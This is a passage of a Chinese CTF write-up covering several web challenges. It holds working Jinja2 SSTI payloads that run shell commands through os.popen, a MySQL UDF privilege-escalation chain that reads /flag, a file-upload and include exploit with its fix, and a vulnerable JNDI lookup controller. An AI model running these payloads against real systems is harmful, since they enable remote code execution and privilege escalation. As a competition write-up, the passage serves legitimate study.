punctuation">&#123;</span>                <span class="token class-name">OutputStream</span> outputStream <span class="token operator">=</span> outputSocket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> read<span class="token punctuation">;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>read <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>outputStream<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> read<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>outputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                            outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var9<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            var10<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var9<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">throw</span> var10<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>outputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        var11<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var8<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                inputSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                outputSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token class-name">OutputStream</span> o<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        o<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        o<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>那么我们先尝试连接一下数据库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"mysql -uctf -p'123456' -e 'show databases;'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功连接</p><p>接下来尝试udf提权</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'show variables like "%plugin%";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706022300239.png" alt="image-20240706022300239"></p><p>路径在<code>/usr/lib/mysql/plugin/</code></p><p>写入so文件</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">&#123;&#123;config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'SELECT  INTO DUMPFILE "/usr/lib/mysql/plugin/udf.so";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'CREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so";\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>于是提权</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'mysql -uctf -p\'123456\' -e \'select sys_eval("cat /flag");\''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706022505490.png" alt="image-20240706022505490"></p><hr><h2 id="brother-revenge（Unsolved）"><a href="#brother-revenge（Unsolved）" class="headerlink" title="brother_revenge（Unsolved）"></a>brother_revenge（Unsolved）</h2><blockquote><p>此题仅整合了他人的wp</p></blockquote><p>前者打了补丁，mysql被降权且secure_file_priv为一个固定目录，因此无法直接 load_file 或者 into outfile 来读文件或者导出udf</p><p>结合前面拿到的环境文件进行分析</p><ol><li><p><a href="http://www.py：SSTI">www.py：SSTI</a></p><p>sql-proxy.jar：代理3306到6666服务端</p></li><li><p>api.py：建立6666连接，每隔10秒执行一次<code>select version();</code><br>api.py：起server_socket到7777，每隔10秒向连接的客户端发送一次<code>&#123;&quot;code&quot;:0, &quot;path&quot;: &quot;&quot;&#125;</code><br>api.py：起Flask到5000，读evil.key，如果正确的话可exec任意python代码</p></li><li><p>update.py：访问7777端口，code&#x3D;1则从path中获取gz文件，解压其中的new.bin到&#x2F;updatedir</p></li></ol><hr><h2 id="w0rdpress（Unsolved）"><a href="#w0rdpress（Unsolved）" class="headerlink" title="w0rdpress（Unsolved）"></a>w0rdpress（Unsolved）</h2><blockquote><p>WordPress SQLite插件代码审计 + CVE-2016-10956 + CVE-2024-2961</p></blockquote><p>参考：<a href="https://blog.kengwang.com.cn/archives/640/">https://blog.kengwang.com.cn/archives/640/</a></p><p>复现环境：<a href="https://kengwang.lanzouo.com/icftJ23q0p2j">https://kengwang.lanzouo.com/icftJ23q0p2j</a></p><hr><h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><h2 id="simplegoods"><a href="#simplegoods" class="headerlink" title="simplegoods"></a>simplegoods</h2><p>judge.php下有文件上传的功能</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706100905568.png" alt="image-20240706100905568"></p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706100926857.png" alt="image-20240706100926857"></p><p>文件位置在&#x2F;tmp&#x2F;data&#x2F;1.png</p><p>接下来找可以include的点</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706101139254.png" alt="image-20240706101139254"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql_query_goods</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM `goods`"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query_goods</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//echo var_dump($row);</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>&lt;img class=card src="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">">&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'price'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.txt'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们需要控制content，发现这里的if条件要求后缀为txt，那么我们得重新上传一个txt</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706103233779.png" alt="image-20240706103233779"></p><p>全局搜索，发现goods_api.php这里可以插入goods的数据</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706101830308.png" alt="image-20240706101830308"></p><p>发现goods_description的值对应sql里面的content</p><p>那么直接传参</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>goods_api<span class="token operator">.</span>php<span class="token operator">?</span>method<span class="token operator">=</span>add<span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">5</span><span class="token operator">&amp;</span>goods_name<span class="token operator">=</span>b<span class="token operator">&amp;</span>goods_price<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>goods_description<span class="token operator">=</span><span class="token operator">/</span>tmp<span class="token operator">/</span>data<span class="token operator">/</span><span class="token number">1.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706103325552.png" alt="image-20240706103325552"></p><p>接下来查询即可，由于judge.php那里有<code>unlink($filename);</code>会删掉我们上传的文件，这里要用到条件竞争</p><p>但是这个靶机访问太多的话还会返回503，nmd</p><h3 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h3><p>直接修改market.php即可，去掉这里的文件包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.txt'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ezSpring"><a href="#ezSpring" class="headerlink" title="ezSpring"></a>ezSpring</h2><p>代码量不大</p><p>AdminController.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">AdminController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"url"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"missing url parameter"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var4<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token string">"Lookup failed"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IndexController.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EzSpringApplication.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EzSpringApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">EzSpringApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">EzSpringApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token 